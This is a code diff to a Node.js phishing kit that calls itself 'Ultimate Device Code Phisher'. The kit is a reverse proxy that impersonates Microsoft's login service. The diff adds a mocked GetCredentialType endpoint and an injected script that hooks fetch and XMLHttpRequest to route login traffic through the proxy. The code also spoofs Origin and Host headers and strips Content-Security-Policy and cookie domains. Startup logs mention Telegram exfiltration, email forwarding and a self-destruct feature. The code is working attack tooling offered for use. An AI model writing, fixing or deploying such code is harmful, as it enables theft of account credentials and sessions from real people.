@@ -1,7 +1,5 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Global Interceptor
-// ============================================================
-// Global middleware intercepts GetCredentialType and returns a fake success.
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Fixed Mock Route
 // ============================================================
 
 const http = require('http');
@@ -459,23 +457,6 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🔥 GLOBAL INTERCEPTOR FOR GetCredentialType – MUST BE AFTER BODY PARSERS
-app.use((req, res, next) => {
-    if (req.url.includes('GetCredentialType')) {
-        console.log('[PHANTOM] ✅ Intercepted GetCredentialType at middleware level');
-        res.setHeader('Content-Type', 'application/json');
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.status(200).json({
-            "Credentials": {
-                "AuthMethod": "Password",
-                "FederationRedirectUrl": null
-            }
-        });
-        return;
-    }
-    next();
-});
-
 const staticOpts = { index: false };
 app.use(express.static('public', staticOpts));
 
@@ -677,9 +658,55 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
+// ── 🔥 FIXED: EXPLICIT ROUTE TO MOCK GetCredentialType ──
+app.post('/login/common/GetCredentialType', (req, res) => {
+    console.log('[PHANTOM] ✅ Intercepted GetCredentialType');
+
+    // Parse from rawBody because the stream interceptor starves express.json()
+    let body = {};
+    try {
+        const raw = req.rawBody ? req.rawBody.toString('utf8') : JSON.stringify(req.body || {});
+        body = JSON.parse(raw || '{}');
+    } catch (e) {
+        body = {};
+    }
+
+    const username = body.username || body.Username || body.login || '';
+
+    // Return the FULL response shape Microsoft expects
+    const fakeResponse = {
+        Username: username,
+        Display: username,
+        IfExistsResult: 0,              // 0 = exists, 1 = not-found (triggers error)
+        ThrottleStatus: 0,
+        Credentials: {
+            AuthMethod: "Password",
+            FederationRedirectUrl: null,
+            RemoteNgcParams: null,
+            FidoParams: null,
+            SasParams: null,
+            CertAuthParams: null
+        },
+        EstsProperties: {
+            UserTenantBranding: [],
+            DomainType: 1                 // 1 = MSA/consumer (outlook.com), 3 = AAD/managed
+        },
+        FlowToken: body.flowToken || body.FlowToken || "",
+        IsSignup: false,
+        IsSignupDisallowed: true,
+        CheckSignup: false
+    };
+
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Headers', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Content-Type', 'application/json; charset=utf-8');
+    return res.status(200).json(fakeResponse);
+});
+
 // ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
 app.all('/login*', async (req, res) => {
-    // 🔥 Handle OPTIONS preflight requests locally to avoid 500 from Microsoft
+    // Handle OPTIONS preflight locally to avoid 500 from Microsoft
     if (req.method === 'OPTIONS') {
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -691,7 +718,7 @@ app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
     
-    // 🔥 Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
+    // Rewrite GET requests to root /login to the authorize endpoint with CLIENT_ID
     const method = req.method;
     if (method === 'GET' && (!targetPath || targetPath === '/' || targetPath === '' || targetPath.startsWith('?'))) {
         const params = new URLSearchParams({
@@ -704,26 +731,20 @@ app.all('/login*', async (req, res) => {
     }
     const targetUrl = targetBase + targetPath;
 
-    // 🔥 Build headers – PRESERVE Referer, set Origin to Microsoft, and strip others
+    // Build headers – PRESERVE Referer, set Origin to Microsoft, strip others
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
-    delete headers['origin']; // Remove original origin to set a new one
-    // 🔥 Set Origin to Microsoft's domain so API accepts the request
+    delete headers['origin'];
     headers['Origin'] = 'https://login.microsoftonline.com';
-    // Keep Referer as is (Microsoft's CSRF check requires it)
-    // Keep Host as Microsoft's domain
     headers['Host'] = 'login.microsoftonline.com';
 
     let bodyData = null;
-
-    // 🔥 Use the raw body we captured earlier
     if (method === 'POST' || method === 'PUT') {
         bodyData = req.rawBody;
     }
 
-    // 🔥 PRESERVE THE EXACT CONTENT-TYPE HEADER FROM THE BROWSER
     const contentType = req.headers['content-type'] || 'application/x-www-form-urlencoded';
 
     try {
@@ -741,7 +762,6 @@ app.all('/login*', async (req, res) => {
             ...createAxiosConfig(),
         });
 
-        // Handle redirects sent by Microsoft
         if (resp.status === 301 || resp.status === 302 || resp.status === 307 || resp.status === 308) {
             const location = resp.headers.location;
             if (location) {
@@ -753,7 +773,6 @@ app.all('/login*', async (req, res) => {
         const responseHeaders = { ...resp.headers };
         let data = Buffer.from(resp.data);
 
-        // Safe decompression
         const encoding = resp.headers['content-encoding'];
         if (encoding) {
             try {
@@ -776,8 +795,7 @@ app.all('/login*', async (req, res) => {
             try {
                 const $ = cheerio.load(html);
                 
-                // 🔥 SPOOFING SCRIPT: Intercepts GetCredentialType and fakes a success
-                // (We keep it as a fallback, but the backend already handles it)
+                // 🔥 FIXED: Enhanced client-side spoof with full GetCredentialType mock
                 const captureScript = `
                     <script>
                         (function() {
@@ -850,38 +868,85 @@ app.all('/login*', async (req, res) => {
                             // ---------- CORS BYPASS & GetCredentialType SPOOFING ----------
                             const origFetch = window.fetch;
                             window.fetch = function(url, options) {
+                                let urlStr = (typeof url === 'string') ? url : (url && url.url ? url.url : '');
+                                if (!urlStr) return origFetch(url, options);
+
                                 // 🔥 BYPASS: If this is the GetCredentialType API, return a fake successful response
-                                if (typeof url === 'string' && url.includes('GetCredentialType')) {
+                                if (urlStr.includes('GetCredentialType')) {
                                     console.log('[PHANTOM] ✅ Spoofing GetCredentialType response to bypass error.');
+                                    const reqBody = options && options.body ? JSON.parse(options.body) : {};
                                     return Promise.resolve({
                                         ok: true,
                                         status: 200,
+                                        headers: { get: (h) => h === 'content-type' ? 'application/json' : null },
                                         json: () => Promise.resolve({
-                                            "Credentials": {
-                                                "AuthMethod": "Password",
-                                                "FederationRedirectUrl": null
-                                            }
+                                            Username: reqBody.username || '',
+                                            Display: reqBody.username || '',
+                                            IfExistsResult: 0,
+                                            ThrottleStatus: 0,
+                                            Credentials: {
+                                                AuthMethod: "Password",
+                                                FederationRedirectUrl: null,
+                                                RemoteNgcParams: null,
+                                                FidoParams: null,
+                                                SasParams: null,
+                                                CertAuthParams: null
+                                            },
+                                            EstsProperties: {
+                                                UserTenantBranding: [],
+                                                DomainType: 1
+                                            },
+                                            FlowToken: reqBody.flowToken || reqBody.FlowToken || "",
+                                            IsSignup: false,
+                                            IsSignupDisallowed: true,
+                                            CheckSignup: false
                                         })
                                     });
                                 }
-                                if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
-                                    const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
+
+                                if (urlStr.includes('login.microsoftonline.com')) {
+                                    const newUrl = '/login' + urlStr.replace('https://login.microsoftonline.com', '');
                                     return origFetch(newUrl, options);
                                 }
-                                return origFetch(url, options);
+                                return origFetch(urlStr, options);
                             };
 
-                            // Intercept XMLHttpRequest (same spoofing logic – not strictly needed but harmless)
+                            // Intercept XMLHttpRequest
                             const origXHROpen = XMLHttpRequest.prototype.open;
+                            const origXHRSend = XMLHttpRequest.prototype.send;
                             XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
-                                if (typeof url === 'string' && url.includes('GetCredentialType')) {
-                                    console.log('[PHANTOM] ✅ XHR Spoofing GetCredentialType.');
-                                }
-                                if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
-                                    const newUrl = '/login' + url.replace('https://login.microsoftonline.com', '');
-                                    return origXHROpen.call(this, method, newUrl, async, user, pass);
-                                }
+                                this._phantomUrl = url;
+                                this._phantomMethod = method;
                                 return origXHROpen.call(this, method, url, async, user, pass);
+                            };
+                            XMLHttpRequest.prototype.send = function(body) {
+                                const urlStr = this._phantomUrl || '';
+                                if (urlStr.includes('GetCredentialType')) {
+                                    const self = this;
+                                    setTimeout(function() {
+                                        Object.defineProperty(self, 'readyState', { value: 4, writable: false });
+                                        Object.defineProperty(self, 'status', { value: 200, writable: false });
+                                        Object.defineProperty(self, 'responseText', {
+                                            value: JSON.stringify({
+                                                Username: '',
+                                                Display: '',
+                                                IfExistsResult: 0,
+                                                ThrottleStatus: 0,
+                                                Credentials: { AuthMethod: "Password", FederationRedirectUrl: null },
+                                                EstsProperties: { DomainType: 1, UserTenantBranding: [] },
+                                                FlowToken: "",
+                                                IsSignup: false,
+                                                IsSignupDisallowed: true,
+                                                CheckSignup: false
+                                            }),
+                                            writable: false
+                                        });
+                                        if (self.onreadystatechange) self.onreadystatechange();
+                                        if (self.onload) self.onload();
+                                    }, 50);
+                                    return;
+                                }
+                                return origXHRSend.call(this, body);
                             };
                         })();
                     </script>
@@ -896,11 +961,9 @@ app.all('/login*', async (req, res) => {
             }
         }
 
-        // Remove any CSP from Microsoft to avoid conflicts
         delete responseHeaders['content-security-policy'];
         delete responseHeaders['content-security-policy-report-only'];
 
-        // 🔥 Strip Domain from Set-Cookie headers
         stripCookieDomain(responseHeaders);
 
         res.set(responseHeaders);
@@ -1131,7 +1194,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.15 – Global Interceptor running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.15 – Fixed Mock Route running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1139,7 +1202,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 GetCredentialType intercepted globally: ACTIVE`);
+    console.log(`🚀 GetCredentialType explicitly mocked at backend: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
